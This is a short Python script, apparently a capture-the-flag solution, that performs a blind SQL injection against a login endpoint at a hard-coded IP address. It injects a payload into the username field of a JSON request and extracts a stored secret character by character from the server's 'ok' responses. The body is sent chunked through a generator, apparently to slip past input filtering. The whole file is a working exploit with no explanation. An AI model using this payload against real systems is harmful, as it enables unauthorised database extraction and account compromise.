import requests

url = 'http://114.55.36.69:50000/auth/login'

flag = ''
for i in range(1, 32):
    for j in '*iozxcvbnmlkjhgfdsaqwertyup0987654321!@#$%^&()_+':
        t = f"iv4n' and substr((select secret from secret limit 1),{i},1)='{j}'-- -"
        tmp = f'{{"uname":"{t}","pwd":"11111111"}}'

        def data():
            for w in tmp:
                yield w.encode()

        r = requests.post(url, data=data(), headers={'Content-Type': 'application/json'})
        if r.json()['msg'] == 'ok':
            flag += j
            break
    print(flag)
